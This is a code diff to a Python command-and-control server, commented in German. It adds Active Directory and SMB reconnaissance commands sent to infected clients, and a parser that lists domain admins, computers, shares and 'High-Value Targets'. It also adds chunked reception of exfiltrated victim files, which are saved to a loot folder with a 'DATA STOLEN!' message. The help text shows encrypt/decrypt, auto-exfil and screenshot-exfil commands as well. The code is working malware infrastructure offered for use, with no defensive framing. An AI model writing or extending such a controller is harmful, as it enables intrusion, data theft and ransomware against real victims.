@@ -28,6 +28,79 @@ client_id = 0
 lock = threading.Lock()
 
 
+def parse_recon_report(data: str) -> None:
+    """
+    Parst und formatiert einen RECON_DATA Report für bessere Lesbarkeit
+
+    Extrahiert strukturierte Daten aus dem Agent-Response und gibt sie
+    farblich formatiert auf der Konsole aus.
+
+    Args:
+        data (str): Raw Recon-Report vom Agent
+
+    Returns:
+        None: Ausgabe erfolgt direkt via print
+    """
+    try:
+        # Extract structured data
+        if "RECON_DATA:AD_STRUCTURE:" in data:
+            print(f"\n{Colors.BOLD}{Colors.HEADER}╔═══════════════════════════════════════════════════╗")
+            print(f"║    🔍 NETWORK RECONNAISSANCE REPORT              ║")
+            print(f"╚═══════════════════════════════════════════════════╝{Colors.ENDC}\n")
+            
+            # Parse key-value pairs
+            parts = data.split("RECON_DATA:AD_STRUCTURE:")[1].split(";")
+            recon_data = {}
+            for part in parts:
+                if "=" in part:
+                    key, value = part.split("=", 1)
+                    recon_data[key] = value
+
+            # Display parsed data
+            if "DOMAIN" in recon_data:
+                print(f"{Colors.BLUE}[*] Domain:{Colors.ENDC} {recon_data['DOMAIN']}")
+            
+            if "ADMINS" in recon_data:
+                admins = recon_data["ADMINS"].split(",")
+                print(f"{Colors.BLUE}[*] Domain Admins ({len(admins)}):{Colors.ENDC}")
+                for admin in admins[:10]:  # Limit to first 10
+                    print(f"    • {admin}")
+                if len(admins) > 10:
+                    print(f"    ... and {len(admins) - 10} more")
+            
+            if "COMPUTERS" in recon_data:
+                computers = recon_data["COMPUTERS"].split(",")
+                print(f"{Colors.BLUE}[*] Computers ({len(computers)}):{Colors.ENDC}")
+                for comp in computers[:10]:
+                    print(f"    • {comp}")
+                if len(computers) > 10:
+                    print(f"    ... and {len(computers) - 10} more")
+            
+            if "SHARES" in recon_data:
+                shares = recon_data["SHARES"].split(",")
+                print(f"{Colors.GREEN}[*] SMB Shares ({len(shares)}):{Colors.ENDC}")
+                for share in shares[:15]:
+                    print(f"    • {share}")
+                if len(shares) > 15:
+                    print(f"    ... and {len(shares) - 15} more")
+            
+            if "HVT" in recon_data:
+                hvts = recon_data["HVT"].split(",")
+                print(f"{Colors.WARNING}{Colors.BOLD}[!] High-Value Targets ({len(hvts)}):{Colors.ENDC}")
+                for hvt in hvts:
+                    print(f"    🎯 {hvt}")
+            
+            print(f"\n{Colors.BOLD}{'─' * 50}{Colors.ENDC}\n")
+        else:
+            # Fallback: show raw if not in expected format
+            print(f"\n{Colors.HEADER}[RECON RESPONSE]{Colors.ENDC}")
+            print(data)
+            print()
+    except Exception as e:
+        print(f"{Colors.FAIL}[!] Error parsing recon data: {e}{Colors.ENDC}")
+        print(f"[!] Raw data: {data[:500]}")
+
+
 def handle_client(
     client_socket: socket.socket, client_address: tuple[str, int], cid: int
 ) -> None:
@@ -50,17 +123,46 @@ def handle_client(
     )
     clients[cid] = client_socket
 
+    exfil_buffer = ""
     try:
         while True:
             # Clientantworten auf befehle erhalten
-            data = client_socket.recv(1048576).decode("utf-8", errors="ignore")
-            if not data:
+            chunk = client_socket.recv(1048576).decode("utf-8", errors="ignore")
+            if not chunk:
                 break
 
-            if "EXFIL_DATA" in data:
+            # Wenn wir gerade EXFIL_DATA sammeln
+            if exfil_buffer:
+                exfil_buffer += chunk
+                # Prüfen ob wir fertig sind (keine weiteren Daten mehr)
+                if len(chunk) < 1048576:  # Letzter Chunk ist kleiner als Buffer
+                    data = exfil_buffer
+                    exfil_buffer = ""
+                else:
+                    continue  # Weiter sammeln
+            elif "EXFIL_DATA" in chunk:
+                # Start einer EXFIL-Übertragung
+                exfil_buffer = chunk
+                if len(chunk) < 1048576:  # Alles in einem Chunk
+                    data = exfil_buffer
+                    exfil_buffer = ""
+                else:
+                    continue  # Weiter sammeln
+            else:
+                data = chunk
+
+            if "RECON_DATA" in data:
+                parse_recon_report(data)
+                print("C2>", end="", flush=True)
+            elif "EXFIL_DATA" in data:
                 try:
                     # Format des Agents: "EXFIL_DATA:<filename>:<base64_string>"
-                    prefix, filename, b64_content = data.strip().split(":", 2)
+                    parts = data.strip().split(":", 2)
+                    if len(parts) != 3:
+                        raise ValueError(f"Invalid EXFIL format: expected 3 parts, got {len(parts)}")
+                    
+                    prefix, filename, b64_content = parts
+                    filename = filename.strip()  # Leerzeichen entfernen
 
                     if not os.path.exists(LOOT_DIR):
                         os.makedirs(LOOT_DIR)
@@ -69,11 +171,12 @@ def handle_client(
                     save_path = os.path.join(LOOT_DIR, safe_filename)
 
                     # Decode and write
+                    decoded_data = base64.b64decode(b64_content)
                     with open(save_path, "wb") as f:
-                        f.write(base64.b64decode(b64_content))
+                        f.write(decoded_data)
 
                     print(
-                        f"\n{Colors.GREEN}{Colors.BOLD}[!] DATA STOLEN! Saved to: {save_path}{Colors.ENDC}"
+                        f"\n{Colors.GREEN}{Colors.BOLD}[!] DATA STOLEN! Saved to: {save_path} ({len(decoded_data)} bytes){Colors.ENDC}"
                     )
                     print(f"C2>", end="", flush=True)
 
@@ -81,6 +184,7 @@ def handle_client(
                     print(
                         f"\n{Colors.FAIL}[!] Error decoding exfiltrated data: {e}{Colors.ENDC}"
                     )
+                    print(f"[!] Data length: {len(data)}, starts with: {data[:100] if len(data) > 100 else data}")
             else:
                 if len(data) > 2000:
                     preview = data[:200]
@@ -328,6 +432,13 @@ def server_shell():
                                 f"{Colors.WARNING}[*] Screenshot-Exfil gestartet auf Client {cid}...{Colors.ENDC}"
                             )
 
+                        elif sub_cmd == "recon":
+                            send_command_to_client(cid, "recon")
+                            print(
+                                f"{Colors.HEADER}[*] Network reconnaissance gestartet auf Client {cid}...{Colors.ENDC}"
+                            )
+                            print(f"{Colors.WARNING}[*] Dies kann einige Sekunden dauern (AD/SMB Enumeration){Colors.ENDC}")
+
                         elif sub_cmd.startswith("kill"):
                             kill_client(cid)
 
@@ -417,6 +528,12 @@ def server_shell():
                         f"{Colors.WARNING}[+] Screenshot-Exfil Befehl an alle Clients gesendet{Colors.ENDC}"
                     )
 
+                elif command == "recon":
+                    broadcast_command("recon")
+                    print(
+                        f"{Colors.HEADER}[+] Network Reconnaissance Befehl an alle Clients gesendet{Colors.ENDC}"
+                    )
+
                 else:
                     broadcast_command(command)
             else:
@@ -471,11 +588,31 @@ def server_shell():
             except ValueError:
                 print("[!] Client ID muss eine Zahl sein")
 
+        elif cmd.startswith("recon "):
+            try:
+                parts = cmd.split(" ", 1)
+                if len(parts) != 2:
+                    print(f"{Colors.WARNING}[!] Usage: recon <client_id>{Colors.ENDC}")
+                else:
+                    cid = int(parts[1])
+                    send_command_to_client(cid, "recon")
+                    print(
+                        f"{Colors.HEADER}[*] Network reconnaissance gestartet auf Client {cid}...{Colors.ENDC}"
+                    )
+                    print(f"{Colors.WARNING}[*] Dies kann einige Sekunden dauern (AD/SMB Enumeration){Colors.ENDC}")
+            except ValueError:
+                print("[!] Client ID muss eine Zahl sein")
+            except Exception as e:
+                print(f"[!] Error: {e}")
+
         elif cmd == "help":
             print(f"{Colors.HEADER}[*] Verfügbare Befehle:{Colors.ENDC}")
             print("  sessions                    - Zeige alle aktiven Sessions")
             print(
                 "  interact <id>               - Interagiere mit einem Client (Shell Mode)"
+            )
+            print(
+                f"  {Colors.BOLD}recon <id>                  - Starte AD/SMB Network Reconnaissance{Colors.ENDC}"
             )
             print(
                 f"  {Colors.BOLD}exfil <id> <remote_path>    - Lade Datei vom Opfer herunter{Colors.ENDC}"
@@ -496,6 +633,7 @@ def server_shell():
                 "  kill <cid>                   - Sendet einen Kill-Befehl an einen spezifischen Client"
             )
             print("  broadcast <cmd>             - Sende Befehl an alle Clients")
+            print("                                (Unterstützt: encrypt, decrypt, auto-exfil, exfil-screenshot, recon)")
             print("  exit                        - Server beenden")
 
         elif cmd == "exit":
